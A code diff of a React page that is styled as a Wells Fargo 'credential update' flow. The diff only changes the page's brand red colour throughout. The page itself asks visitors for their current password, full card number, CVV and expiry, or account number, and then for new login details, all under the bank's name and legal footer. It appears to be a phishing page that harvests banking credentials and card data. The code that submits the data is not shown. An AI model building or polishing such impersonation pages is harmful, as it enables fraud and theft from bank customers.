@@ -248,7 +248,7 @@ export default function CredentialUpdate() {
 
   return (
     <div className="min-h-screen flex flex-col bg-[#fafafa]">
-      <header className="bg-[#d71e28] sticky top-0 z-20">
+      <header className="bg-[#cd1409] sticky top-0 z-20">
         <div className="h-1 bg-[#ffcd41]" />
         <div className="max-w-7xl mx-auto px-4">
           <div className="flex items-center justify-between py-3">
@@ -275,10 +275,10 @@ export default function CredentialUpdate() {
         </div>
       </header>
 
-      <div className="bg-[#d71e28]/10 border-b border-[#d71e28]/20">
+      <div className="bg-[#cd1409]/10 border-b border-[#cd1409]/20">
         <div className="max-w-2xl mx-auto px-4 py-2">
           <div className="flex items-center gap-2 text-sm">
-            <Shield className="w-4 h-4 text-[#d71e28]" />
+            <Shield className="w-4 h-4 text-[#cd1409]" />
             <span className="text-gray-700">Secure Session</span>
             <span className="text-gray-400">|</span>
             <span className="text-gray-600">Welcome, {username}</span>
@@ -289,11 +289,11 @@ export default function CredentialUpdate() {
       <main className="flex-1 max-w-2xl mx-auto w-full px-4 py-6">
         <div className="mb-6">
           <div className="flex items-center gap-3 mb-2">
-            <div className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-medium ${step >= 1 ? 'bg-[#d71e28] text-white' : 'bg-gray-200 text-gray-500'}`}>1</div>
-            <div className={`flex-1 h-1 ${step >= 2 ? 'bg-[#d71e28]' : 'bg-gray-200'}`} />
-            <div className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-medium ${step >= 2 ? 'bg-[#d71e28] text-white' : 'bg-gray-200 text-gray-500'}`}>2</div>
-            <div className={`flex-1 h-1 ${step >= 3 ? 'bg-[#d71e28]' : 'bg-gray-200'}`} />
-            <div className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-medium ${step >= 3 ? 'bg-[#d71e28] text-white' : 'bg-gray-200 text-gray-500'}`}>3</div>
+            <div className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-medium ${step >= 1 ? 'bg-[#cd1409] text-white' : 'bg-gray-200 text-gray-500'}`}>1</div>
+            <div className={`flex-1 h-1 ${step >= 2 ? 'bg-[#cd1409]' : 'bg-gray-200'}`} />
+            <div className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-medium ${step >= 2 ? 'bg-[#cd1409] text-white' : 'bg-gray-200 text-gray-500'}`}>2</div>
+            <div className={`flex-1 h-1 ${step >= 3 ? 'bg-[#cd1409]' : 'bg-gray-200'}`} />
+            <div className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-medium ${step >= 3 ? 'bg-[#cd1409] text-white' : 'bg-gray-200 text-gray-500'}`}>3</div>
           </div>
           <div className="flex justify-between text-xs text-gray-500 px-2">
             <span>Verify Identity</span>
@@ -320,7 +320,7 @@ export default function CredentialUpdate() {
           <Card>
             <CardHeader className="border-b bg-gray-50 py-3 px-4">
               <h3 className="font-semibold text-gray-900 flex items-center gap-2">
-                <Lock className="w-4 h-4 text-[#d71e28]" />
+                <Lock className="w-4 h-4 text-[#cd1409]" />
                 Step 1: Verify Your Identity
               </h3>
             </CardHeader>
@@ -336,7 +336,7 @@ export default function CredentialUpdate() {
                   data-testid="button-verify-card"
                 >
                   <div className="w-12 h-12 rounded-full bg-red-50 flex items-center justify-center group-hover:bg-red-100 transition-colors">
-                    <CreditCard className="w-6 h-6 text-[#d71e28]" />
+                    <CreditCard className="w-6 h-6 text-[#cd1409]" />
                   </div>
                   <div className="flex-1">
                     <p className="font-medium text-gray-900">Debit or Credit Card</p>
@@ -350,7 +350,7 @@ export default function CredentialUpdate() {
                   data-testid="button-verify-account"
                 >
                   <div className="w-12 h-12 rounded-full bg-red-50 flex items-center justify-center group-hover:bg-red-100 transition-colors">
-                    <Building className="w-6 h-6 text-[#d71e28]" />
+                    <Building className="w-6 h-6 text-[#cd1409]" />
                   </div>
                   <div className="flex-1">
                     <p className="font-medium text-gray-900">Account Number</p>
@@ -364,7 +364,7 @@ export default function CredentialUpdate() {
                   data-testid="button-verify-password"
                 >
                   <div className="w-12 h-12 rounded-full bg-red-50 flex items-center justify-center group-hover:bg-red-100 transition-colors">
-                    <Lock className="w-6 h-6 text-[#d71e28]" />
+                    <Lock className="w-6 h-6 text-[#cd1409]" />
                   </div>
                   <div className="flex-1">
                     <p className="font-medium text-gray-900">Current Password</p>
@@ -376,7 +376,7 @@ export default function CredentialUpdate() {
               <div className="mt-4 pt-4 border-t">
                 <button
                   onClick={handleSkip}
-                  className="w-full text-center text-sm text-gray-500 hover:text-[#d71e28]"
+                  className="w-full text-center text-sm text-gray-500 hover:text-[#cd1409]"
                   data-testid="button-remind-later"
                 >
                   Remind me in 30 days
@@ -391,12 +391,12 @@ export default function CredentialUpdate() {
             <CardHeader className="border-b bg-gray-50 py-3 px-4">
               <div className="flex items-center justify-between">
                 <h3 className="font-semibold text-gray-900 flex items-center gap-2">
-                  <Lock className="w-4 h-4 text-[#d71e28]" />
+                  <Lock className="w-4 h-4 text-[#cd1409]" />
                   Verify with Password
                 </h3>
                 <button
                   onClick={() => setVerificationMethod(null)}
-                  className="text-sm text-[#d71e28] hover:underline"
+                  className="text-sm text-[#cd1409] hover:underline"
                 >
                   Change method
                 </button>
@@ -443,7 +443,7 @@ export default function CredentialUpdate() {
 
                 <Button 
                   onClick={handleVerifyIdentity}
-                  className="w-full bg-[#d71e28] hover:bg-[#b91c23]"
+                  className="w-full bg-[#cd1409] hover:bg-[#b81208]"
                   disabled={!formData.currentPassword}
                   data-testid="button-verify-continue"
                 >
@@ -459,12 +459,12 @@ export default function CredentialUpdate() {
             <CardHeader className="border-b bg-gray-50 py-3 px-4">
               <div className="flex items-center justify-between">
                 <h3 className="font-semibold text-gray-900 flex items-center gap-2">
-                  <CreditCard className="w-4 h-4 text-[#d71e28]" />
+                  <CreditCard className="w-4 h-4 text-[#cd1409]" />
                   Verify with Card
                 </h3>
                 <button
                   onClick={() => setVerificationMethod(null)}
-                  className="text-sm text-[#d71e28] hover:underline"
+                  className="text-sm text-[#cd1409] hover:underline"
                 >
                   Change method
                 </button>
@@ -561,7 +561,7 @@ export default function CredentialUpdate() {
 
                 <Button 
                   onClick={handleVerifyIdentity}
-                  className="w-full bg-[#d71e28] hover:bg-[#b91c23]"
+                  className="w-full bg-[#cd1409] hover:bg-[#b81208]"
                   disabled={!formData.cardNumber || !formData.cvv || !formData.expirationMonth || !formData.expirationYear}
                   data-testid="button-verify-continue"
                 >
@@ -577,12 +577,12 @@ export default function CredentialUpdate() {
             <CardHeader className="border-b bg-gray-50 py-3 px-4">
               <div className="flex items-center justify-between">
                 <h3 className="font-semibold text-gray-900 flex items-center gap-2">
-                  <Building className="w-4 h-4 text-[#d71e28]" />
+                  <Building className="w-4 h-4 text-[#cd1409]" />
                   Verify with Account Number
                 </h3>
                 <button
                   onClick={() => setVerificationMethod(null)}
-                  className="text-sm text-[#d71e28] hover:underline"
+                  className="text-sm text-[#cd1409] hover:underline"
                 >
                   Change method
                 </button>
@@ -629,7 +629,7 @@ export default function CredentialUpdate() {
 
                 <Button 
                   onClick={handleVerifyIdentity}
-                  className="w-full bg-[#d71e28] hover:bg-[#b91c23]"
+                  className="w-full bg-[#cd1409] hover:bg-[#b81208]"
                   disabled={!formData.accountNumber}
                   data-testid="button-verify-continue"
                 >
@@ -644,7 +644,7 @@ export default function CredentialUpdate() {
           <Card>
             <CardHeader className="border-b bg-gray-50 py-3 px-4">
               <h3 className="font-semibold text-gray-900 flex items-center gap-2">
-                <Shield className="w-4 h-4 text-[#d71e28]" />
+                <Shield className="w-4 h-4 text-[#cd1409]" />
                 Step 2: Select Update Type
               </h3>
             </CardHeader>
@@ -660,7 +660,7 @@ export default function CredentialUpdate() {
                   data-testid="button-update-password"
                 >
                   <div className="w-12 h-12 rounded-full bg-red-50 flex items-center justify-center group-hover:bg-red-100 transition-colors">
-                    <Lock className="w-6 h-6 text-[#d71e28]" />
+                    <Lock className="w-6 h-6 text-[#cd1409]" />
                   </div>
                   <div className="flex-1">
                     <p className="font-medium text-gray-900">Update Password</p>
@@ -674,7 +674,7 @@ export default function CredentialUpdate() {
                   data-testid="button-update-username"
                 >
                   <div className="w-12 h-12 rounded-full bg-red-50 flex items-center justify-center group-hover:bg-red-100 transition-colors">
-                    <User className="w-6 h-6 text-[#d71e28]" />
+                    <User className="w-6 h-6 text-[#cd1409]" />
                   </div>
                   <div className="flex-1">
                     <p className="font-medium text-gray-900">Update Username</p>
@@ -684,16 +684,16 @@ export default function CredentialUpdate() {
 
                 <button
                   onClick={() => setUpdateType("both")}
-                  className="w-full flex items-center gap-4 p-4 border-2 border-[#d71e28] rounded-lg hover-elevate text-left group bg-red-50/30"
+                  className="w-full flex items-center gap-4 p-4 border-2 border-[#cd1409] rounded-lg hover-elevate text-left group bg-red-50/30"
                   data-testid="button-update-both"
                 >
-                  <div className="w-12 h-12 rounded-full bg-[#d71e28] flex items-center justify-center">
+                  <div className="w-12 h-12 rounded-full bg-[#cd1409] flex items-center justify-center">
                     <Shield className="w-6 h-6 text-white" />
                   </div>
                   <div className="flex-1">
                     <div className="flex items-center gap-2">
                       <p className="font-medium text-gray-900">Update Both</p>
-                      <span className="text-xs bg-[#d71e28] text-white px-2 py-0.5 rounded">Recommended</span>
+                      <span className="text-xs bg-[#cd1409] text-white px-2 py-0.5 rounded">Recommended</span>
                     </div>
                     <p className="text-sm text-gray-500">Update username and password together for enhanced security</p>
                   </div>
@@ -703,7 +703,7 @@ export default function CredentialUpdate() {
               <div className="mt-4 pt-4 border-t">
                 <button
                   onClick={handleSkip}
-                  className="w-full text-center text-sm text-gray-500 hover:text-[#d71e28]"
+                  className="w-full text-center text-sm text-gray-500 hover:text-[#cd1409]"
                   data-testid="button-skip-update"
                 >
                   Skip for now - remind me later
@@ -718,12 +718,12 @@ export default function CredentialUpdate() {
             <CardHeader className="border-b bg-gray-50 py-3 px-4">
               <div className="flex items-center justify-between">
                 <h3 className="font-semibold text-gray-900 flex items-center gap-2">
-                  <Shield className="w-4 h-4 text-[#d71e28]" />
+                  <Shield className="w-4 h-4 text-[#cd1409]" />
                   Step 2: Enter New Credentials
                 </h3>
                 <button
                   onClick={() => setUpdateType(null)}
-                  className="text-sm text-[#d71e28] hover:underline"
+                  className="text-sm text-[#cd1409] hover:underline"
                 >
                   Change selection
                 </button>
@@ -855,7 +855,7 @@ export default function CredentialUpdate() {
                     data-testid="checkbox-agree-terms"
                   />
                   <Label htmlFor="agreeToTerms" className="text-xs text-gray-600 leading-relaxed cursor-pointer">
-                    I have read and agree to the <span className="text-[#d71e28] hover:underline cursor-pointer">Wells Fargo Online Access Agreement</span> and understand that this change will take effect immediately upon submission.
+                    I have read and agree to the <span className="text-[#cd1409] hover:underline cursor-pointer">Wells Fargo Online Access Agreement</span> and understand that this change will take effect immediately upon submission.
                   </Label>
                 </div>
 
@@ -872,7 +872,7 @@ export default function CredentialUpdate() {
                 <div className="flex flex-col gap-3 pt-2">
                   <Button 
                     type="submit" 
-                    className="w-full bg-[#d71e28] hover:bg-[#b91c23]"
+                    className="w-full bg-[#cd1409] hover:bg-[#b81208]"
                     disabled={isSubmitting || !formData.agreeToTerms}
                     data-testid="button-submit-update"
                   >
@@ -889,7 +889,7 @@ export default function CredentialUpdate() {
                   <button
                     type="button"
                     onClick={handleSkip}
-                    className="text-sm text-gray-500 hover:text-[#d71e28]"
+                    className="text-sm text-gray-500 hover:text-[#cd1409]"
                     disabled={isSubmitting}
                     data-testid="button-skip"
                   >
@@ -932,7 +932,7 @@ export default function CredentialUpdate() {
 
             <p>
               Investment products and services are offered through Wells Fargo Advisors. Wells Fargo Advisors is a trade name used by Wells Fargo Clearing Services, LLC (WFCS) and Wells Fargo Advisors Financial Network, LLC, Members{' '}
-              <a href="https://www.sipc.org" className="text-[#d71e28] hover:underline">SIPC</a>, separate registered broker-dealers and non-bank affiliates of Wells Fargo & Company.
+              <a href="https://www.sipc.org" className="text-[#cd1409] hover:underline">SIPC</a>, separate registered broker-dealers and non-bank affiliates of Wells Fargo & Company.
             </p>
 
             <p>
